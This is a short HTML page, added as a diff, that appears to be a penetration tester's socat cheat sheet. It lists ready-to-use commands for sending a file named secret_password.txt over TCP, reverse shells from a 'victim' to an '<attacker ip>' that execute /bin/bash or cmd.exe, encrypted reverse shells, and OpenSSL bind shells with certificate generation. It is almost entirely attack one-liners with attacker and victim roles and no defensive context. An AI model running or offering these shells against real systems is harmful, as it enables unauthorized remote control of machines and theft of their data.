@@ -1,0 +1,65 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>socat</title>
+</head><body><b>connect to a service<br/>
+</b><br/>
+socat - TCP4:&lt;ip addresss&gt;:80<br/>
+<br/>
+<br/>
+<b>listening</b><br/>
+sudo socat TCP4-LISTEN:443 STDOUT<br/>
+<br/>
+<br/>
+<br/>
+<b>transfering file</b><br/>
+<br/>
+<i>sender</i><br/>
+<br/>
+sudo socat TCP4-LISTEN:443,fork file:secret_password.txt<br/>
+<br/>
+<i><br/>
+</i><i>receiver</i><br/>
+<br/>
+socat TCP4:&lt;ip sender&gt;:443 file:received_file.txt,create<br/>
+<br/>
+<br/>
+<b>reverse shell</b><br/>
+<br/>
+<i>listener</i><br/>
+<br/>
+socat -d -d TCP4-LISTEN:443 STDOUT<br/>
+<br/>
+<i><br/>
+</i><i>victim</i><br/>
+<br/>
+socat TCP4:&lt;attacker ip&gt;:443 EXEC:/bin/bash<br/>
+<br/>
+<br/>
+encrypted<br/>
+<br/>
+socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT<br/>
+<br/>
+<br/>
+socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash<br/>
+socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:'cmd.exe',pipes<br/>
+<br/>
+<br/>
+<b>Encrypted Bind Shells<br/>
+<br/>
+</b><i>victim</i><br/>
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt &nbsp;<br/>
+cat bind_shell.key bind_shell.crt &gt; bind_shell.pem<br/>
+<br/>
+socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes<br/>
+socat OPENSSL-LISTEN:56789,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash<br/>
+<br/>
+<i>attacker</i><br/>
+<br/>
+socat - OPENSSL:&lt;ip victim&gt;:443, verify=0<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
